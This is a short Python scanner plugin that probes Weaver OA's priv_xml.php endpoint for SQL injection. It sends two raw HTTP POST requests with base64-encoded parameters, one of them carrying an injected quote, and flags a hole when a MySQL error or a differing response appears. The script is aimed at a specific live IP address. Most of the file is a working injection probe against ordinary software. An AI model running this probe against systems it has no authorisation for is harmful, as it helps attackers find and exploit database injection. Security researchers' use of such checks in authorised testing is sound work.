#!/usr/bin/python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2015-0105290
import urlparse
def assign(service, arg):
    if service == "weaver_oa":
        return True, arg


def audit(url):
    true_raw = '''POST /inc/priv_user_list/priv_xml.php HTTP/1.1
Host: www.baidu.com
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abzz
Content-Length: 44
Content-Type: application/x-www-form-urlencoded

par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzFd'''

    false_raw = '''POST /inc/priv_user_list/priv_xml.php HTTP/1.1
Host: www.baidu.com
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=8ac23578dd33b21df60e37acfb55abee
Content-Length: 52
Content-Type: application/x-www-form-urlencoded

par=W3ZpZXdfdHlwZV06WzBdfFt1c2VycHJpdl06WzEnXQ%3d%3d'''
    url += 'inc/priv_user_list/priv_xml.php'
    code, head,res, errcode, _ = curl.curl2(url,raw=true_raw)
    if 'action' in res:
        code, head,res, errcode, _ = curl.curl2(url,raw=false_raw)
        if 'action' not in res or 'mysql_fetch_array' in res:
            security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])